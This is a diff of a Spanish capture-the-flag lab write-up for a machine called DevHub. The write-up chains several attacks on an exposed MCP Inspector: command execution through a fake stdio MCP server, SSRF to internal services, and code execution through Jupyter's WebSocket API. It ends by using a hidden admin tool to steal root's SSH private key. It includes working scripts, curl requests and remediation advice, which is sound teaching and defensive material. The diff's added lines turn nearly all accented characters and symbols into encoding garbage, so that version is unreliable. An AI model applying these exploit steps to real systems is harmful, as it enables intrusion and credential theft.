@@ -1,7 +1,7 @@
----
+﻿---
 layout: single
 classes: wide
-title: "HTB DevHub - Writeup"
+title: "DevHub - Writeup"
 date: 2026-06-03
 difficulty: Media
 operating_system: Linux
@@ -16,10 +16,10 @@ tags:
   - OPSMCP
   - RCE
   - Hidden Tools
-summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar comandos arbitrarios vía stdio, SSRF a servicios internos, y escalada a root mediante hidden tools del servidor OPSMCP que expone la clave privada SSH de root."
+summary: "ExplotaciÃ³n de MCPJam Inspector expuesto en puerto 6274 para ejecutar comandos arbitrarios vÃ­a stdio, SSRF a servicios internos, y escalada a root mediante hidden tools del servidor OPSMCP que expone la clave privada SSH de root."
 ---
 
-## Información general
+## InformaciÃ³n general
 
 | Campo | Valor |
 |-------|-------|
@@ -33,7 +33,7 @@ summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar
 
 ## Reconocimiento
 
-Empezamos escaneando todos los puertos de la máquina para identificar servicios expuestos:
+Empezamos escaneando todos los puertos de la mÃ¡quina para identificar servicios expuestos:
 
 ```bash
 nmap -sV -sC --open -T4 [REDACTED]
@@ -41,10 +41,10 @@ nmap -sV -sC --open -T4 [REDACTED]
 
 Resultados relevantes:
 
-| Puerto | Servicio | Versión |
+| Puerto | Servicio | VersiÃ³n |
 |--------|----------|---------|
 | 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
-| 80/tcp | HTTP | nginx 1.18.0 — redirige a `http://devhub.htb/` |
+| 80/tcp | HTTP | nginx 1.18.0 â€” redirige a `http://devhub.htb/` |
 | 6274/tcp | HTTP | **MCPJam Inspector** |
 
 Agregamos el dominio al `/etc/hosts` para poder navegar:
@@ -55,9 +55,9 @@ echo "[REDACTED]  devhub.htb" >> /etc/hosts
 
 ---
 
-## Enumeración web
+## EnumeraciÃ³n web
 
-La web principal en `devhub.htb:80` es una página estática que documenta la infraestructura interna: menciona un **Analytics Dashboard** (Jupyter, solo localhost:8888), un servidor **OPSMCP** interno en `127.0.0.1:5000`, y el **MCPJam Inspector** en el puerto 6274.
+La web principal en `devhub.htb:80` es una pÃ¡gina estÃ¡tica que documenta la infraestructura interna: menciona un **Analytics Dashboard** (Jupyter, solo localhost:8888), un servidor **OPSMCP** interno en `127.0.0.1:5000`, y el **MCPJam Inspector** en el puerto 6274.
 
 El MCPJam Inspector es una interfaz web que permite conectar servidores MCP remotos y ejecutar herramientas. Enumeramos los endpoints de su API leyendo el JavaScript compilado:
 
@@ -68,21 +68,21 @@ curl -s http://[REDACTED]:6274/assets/index-DRYhT9Xb.js \
 
 Endpoints clave descubiertos:
 
-| Endpoint | Función |
+| Endpoint | FunciÃ³n |
 |----------|---------|
 | `/api/mcp/connect` | Conecta servidores MCP externos (stdio/SSE/HTTP) |
 | `/api/mcp/tools/execute` | Ejecuta herramientas de un servidor conectado |
 | `/api/mcp/tools/list` | Lista herramientas disponibles |
-| `/api/mcp/oauth/debug/proxy` | **Proxy HTTP interno** — vector SSRF |
+| `/api/mcp/oauth/debug/proxy` | **Proxy HTTP interno** â€” vector SSRF |
 | `/api/mcp/servers` | Lista servidores conectados |
 
-Ninguno de estos endpoints requiere autenticación.
+Ninguno de estos endpoints requiere autenticaciÃ³n.
 
 ---
 
 ## SSRF via MCP Inspector
 
-El endpoint `/api/mcp/oauth/debug/proxy` actúa como proxy HTTP desde el servidor, con soporte de headers personalizados y métodos HTTP arbitrarios. Esto nos permite sondear servicios internos.
+El endpoint `/api/mcp/oauth/debug/proxy` actÃºa como proxy HTTP desde el servidor, con soporte de headers personalizados y mÃ©todos HTTP arbitrarios. Esto nos permite sondear servicios internos.
 
 ### Descubrimiento del OPSMCP interno
 
@@ -100,17 +100,17 @@ Respuesta:
 {"error":"Unauthorized","message":"Valid X-API-Key header required"}
 ```
 
-El servicio existe, corre en `:5000` y requere un header `X-API-Key` para autorizar. También confirmamos que **Jupyter Lab** corre en `:8888`, aunque de momento sin acceso.
+El servicio existe, corre en `:5000` y requere un header `X-API-Key` para autorizar. TambiÃ©n confirmamos que **Jupyter Lab** corre en `:8888`, aunque de momento sin acceso.
 
 ---
 
 ## RCE como mcp-dev via MCP stdio
 
-El endpoint `/api/mcp/connect` acepta servidores MCP de tipo `stdio`, lo que permite especificar un **comando del sistema** que el servidor ejecuta como proceso hijo. Básicamente, esto es RCE directo.
+El endpoint `/api/mcp/connect` acepta servidores MCP de tipo `stdio`, lo que permite especificar un **comando del sistema** que el servidor ejecuta como proceso hijo. BÃ¡sicamente, esto es RCE directo.
 
 ### Servidor MCP falso
 
-Creamos un servidor MCP mínimo en Python que responde al handshake JSON-RPC del protocolo MCP y, al listar herramientas, ejecuta comandos del sistema:
+Creamos un servidor MCP mÃ­nimo en Python que responde al handshake JSON-RPC del protocolo MCP y, al listar herramientas, ejecuta comandos del sistema:
 
 ```python
 #!/usr/bin/env python3
@@ -134,7 +134,7 @@ for chunk in sys.stdin:
                 "serverInfo":{"name":"x","version":"1"}
             }}), flush=True)
         elif m == 'tools/list':
-            # Ejecutamos comandos y devolvemos la salida en la descripción
+            # Ejecutamos comandos y devolvemos la salida en la descripciÃ³n
             data = subprocess.getoutput("ps aux; id; env")
             print(json.dumps({"jsonrpc":"2.0","id":i,"result":{"tools":[{
                 "name":"info",
@@ -146,7 +146,7 @@ for chunk in sys.stdin:
                 print(json.dumps({"jsonrpc":"2.0","id":i,"result":{}}), flush=True)
 ```
 
-### Conexión del servidor falso
+### ConexiÃ³n del servidor falso
 
 Enviamos el script inline y conectamos el servidor MCP falso:
 
@@ -161,7 +161,7 @@ curl -s http://[REDACTED]:6274/api/mcp/tools/list \
   -d '{"serverId": "recon"}'
 ```
 
-Información obtenida de la respuesta:
+InformaciÃ³n obtenida de la respuesta:
 
 - Usuario del proceso: **mcp-dev**
 - Home: `/home/mcp-dev`
@@ -172,7 +172,7 @@ Información obtenida de la respuesta:
 
 ## RCE como analyst via Jupyter WebSocket
 
-Jupyter Lab expone una API WebSocket para ejecutar código en kernels Python. El proxy HTTP del MCP Inspector no soporta WebSockets, así que necesitamos implementar un **cliente WebSocket raw** usando sockets TCP.
+Jupyter Lab expone una API WebSocket para ejecutar cÃ³digo en kernels Python. El proxy HTTP del MCP Inspector no soporta WebSockets, asÃ­ que necesitamos implementar un **cliente WebSocket raw** usando sockets TCP.
 
 ### Subida del script al servidor
 
@@ -249,7 +249,7 @@ def run_code(code):
     return "".join(outputs)
 ```
 
-### Ejecución del comando como analyst
+### EjecuciÃ³n del comando como analyst
 
 Conectamos el script como servidor MCP y lo invocamos para leer la flag de usuario y la API key del OPSMCP:
 
@@ -275,9 +275,9 @@ Resultado:
 
 ## Escalada a root via OPSMCP hidden tools
 
-### Análisis del servidor OPSMCP
+### AnÃ¡lisis del servidor OPSMCP
 
-Desde la sesión como `mcp-dev` (via MCP stdio), pudimos leer el código fuente del servidor OPSMCP en `/opt/opsmcp/server.py`. Ahí descubrimos que el servidor tiene **herramientas ocultas** que no aparecen en el endpoint público `/tools/list`:
+Desde la sesiÃ³n como `mcp-dev` (via MCP stdio), pudimos leer el cÃ³digo fuente del servidor OPSMCP en `/opt/opsmcp/server.py`. AhÃ­ descubrimos que el servidor tiene **herramientas ocultas** que no aparecen en el endpoint pÃºblico `/tools/list`:
 
 ```python
 # Fragmento de server.py
@@ -293,11 +293,11 @@ HIDDEN_TOOLS = {
 }
 ```
 
-La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.ssh/id_rsa` — y como el servidor OPSMCP corre como **root**, puede leer cualquier archivo.
+La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.ssh/id_rsa` â€” y como el servidor OPSMCP corre como **root**, puede leer cualquier archivo.
 
-### Extracción de la clave privada de root
+### ExtracciÃ³n de la clave privada de root
 
-Usamos el proxy SSRF del MCP Inspector para llamar a la tool oculta, ahora autenticándonos con la API key que extrajimos como analyst:
+Usamos el proxy SSRF del MCP Inspector para llamar a la tool oculta, ahora autenticÃ¡ndonos con la API key que extrajimos como analyst:
 
 ```bash
 curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
@@ -337,33 +337,33 @@ cat /root/root.txt
 
 ---
 
-## Cadena de explotación
+## Cadena de explotaciÃ³n
 
 ```
-Puerto 6274 (MCPJam Inspector) — API REST sin autenticación
-        │
-        ▼
+Puerto 6274 (MCPJam Inspector) â€” API REST sin autenticaciÃ³n
+        â”‚
+        â–¼
 /api/mcp/connect [type: stdio]
-→ RCE como mcp-dev
-→ ps aux filtra token de Jupyter y credenciales
-        │
-        ▼
+â†’ RCE como mcp-dev
+â†’ ps aux filtra token de Jupyter y credenciales
+        â”‚
+        â–¼
 /api/mcp/oauth/debug/proxy [SSRF]
-→ Acceso a servicios internos: OPSMCP (:5000), Jupyter (:8888)
-        │
-        ▼
+â†’ Acceso a servicios internos: OPSMCP (:5000), Jupyter (:8888)
+        â”‚
+        â–¼
 WebSocket raw al kernel de Jupyter (:8888)
-→ RCE como analyst
-→ Lectura de /home/analyst/.opsmcp_key
-→ user.txt ✅
-        │
-        ▼
+â†’ RCE como analyst
+â†’ Lectura de /home/analyst/.opsmcp_key
+â†’ user.txt âœ…
+        â”‚
+        â–¼
 OPSMCP hidden tool ops._admin_dump
-→ Lectura de /root/.ssh/id_rsa (OPSMCP corre como root)
-        │
-        ▼
+â†’ Lectura de /root/.ssh/id_rsa (OPSMCP corre como root)
+        â”‚
+        â–¼
 SSH con clave privada de root
-→ root.txt ✅
+â†’ root.txt âœ…
 ```
 
 ---
@@ -372,38 +372,38 @@ SSH con clave privada de root
 
 | # | Vector | Impacto |
 |---|--------|---------|
-| 1 | MCPJam Inspector sin autenticación expuesto externamente | Acceso completo a API interna |
+| 1 | MCPJam Inspector sin autenticaciÃ³n expuesto externamente | Acceso completo a API interna |
 | 2 | `/api/mcp/connect` ejecuta comandos arbitrarios via stdio | RCE como `mcp-dev` |
-| 3 | `/api/mcp/oauth/debug/proxy` sin restricción de red local | SSRF a servicios internos |
+| 3 | `/api/mcp/oauth/debug/proxy` sin restricciÃ³n de red local | SSRF a servicios internos |
 | 4 | Token de Jupyter visible en `ps aux` | Acceso a Jupyter como `analyst` |
-| 5 | Hidden tools en OPSMCP accesibles desde localhost sin verificación adicional | Lectura de `/root/.ssh/id_rsa` |
+| 5 | Hidden tools en OPSMCP accesibles desde localhost sin verificaciÃ³n adicional | Lectura de `/root/.ssh/id_rsa` |
 | 6 | OPSMCP ejecuta como root sin necesidad de privilegios | Escalada completa a root |
 
 ---
 
-## Lecciones técnicas
+## Lecciones tÃ©cnicas
 
 ### MCP (Model Context Protocol)
-El protocolo MCP permite conectar servidores de herramientas externas a aplicaciones. El tipo `stdio` ejecuta un comando local como servidor MCP — si no se restringe qué comandos pueden ejecutarse, es RCE directo.
+El protocolo MCP permite conectar servidores de herramientas externas a aplicaciones. El tipo `stdio` ejecuta un comando local como servidor MCP â€” si no se restringe quÃ© comandos pueden ejecutarse, es RCE directo.
 
 ### SSRF via proxy HTTP interno
-Un endpoint de debugging que funciona como proxy HTTP sin restricciones de red permite sondear servicios internos. Combinado con MCP, permite interactuar con servicios que de otra forma serían inaccesibles.
+Un endpoint de debugging que funciona como proxy HTTP sin restricciones de red permite sondear servicios internos. Combinado con MCP, permite interactuar con servicios que de otra forma serÃ­an inaccesibles.
 
 ### Jupyter WebSocket API
-Jupyter Lab expone una API WebSocket para comunicación con kernels. Aunque el proxy HTTP no soporte WebSockets, se puede implementar un cliente raw desde el propio servidor.
+Jupyter Lab expone una API WebSocket para comunicaciÃ³n con kernels. Aunque el proxy HTTP no soporte WebSockets, se puede implementar un cliente raw desde el propio servidor.
 
 ### Hidden tools
-Exponer herramientas que no aparecen en el listado público no es seguridad por oscuridad — el código fuente revela su existencia. Si además corren con privilegios elevados, el impacto es crítico.
+Exponer herramientas que no aparecen en el listado pÃºblico no es seguridad por oscuridad â€” el cÃ³digo fuente revela su existencia. Si ademÃ¡s corren con privilegios elevados, el impacto es crÃ­tico.
 
 ---
 
-## Remediación
+## RemediaciÃ³n
 
-| Hallazgo | Remedición |
+| Hallazgo | RemediciÃ³n |
 |----------|------------|
-| MCP Inspector expuesto sin autenticación | Requerir autenticación en todos los endpoints del MCP Inspector |
-| `/api/mcp/connect` permite ejecución de comandos arbitrarios | Restringir `type: stdio` solo a servidores MCP aprobados o deshabilitarlo |
-| `/api/mcp/oauth/debug/proxy` sin restricciones de red | Limitar a direcciones IP específicas o eliminar el endpoint en producción |
-| Token de Jupyter visible en procesos | Usar un archivo de configuración en vez de argumentos de línea de comandos |
-| Hidden tools accesibles sin verify adicional | Requerir autenticación de dos factores o un segundo factor de aprobación |
-| OPSMCP ejecutándose como root | Ejecutar con el menor privilegio necesario (principle of least privilege) |
+| MCP Inspector expuesto sin autenticaciÃ³n | Requerir autenticaciÃ³n en todos los endpoints del MCP Inspector |
+| `/api/mcp/connect` permite ejecuciÃ³n de comandos arbitrarios | Restringir `type: stdio` solo a servidores MCP aprobados o deshabilitarlo |
+| `/api/mcp/oauth/debug/proxy` sin restricciones de red | Limitar a direcciones IP especÃ­ficas o eliminar el endpoint en producciÃ³n |
+| Token de Jupyter visible en procesos | Usar un archivo de configuraciÃ³n en vez de argumentos de lÃ­nea de comandos |
+| Hidden tools accesibles sin verify adicional | Requerir autenticaciÃ³n de dos factores o un segundo factor de aprobaciÃ³n |
+| OPSMCP ejecutÃ¡ndose como root | Ejecutar con el menor privilegio necesario (principle of least privilege) |
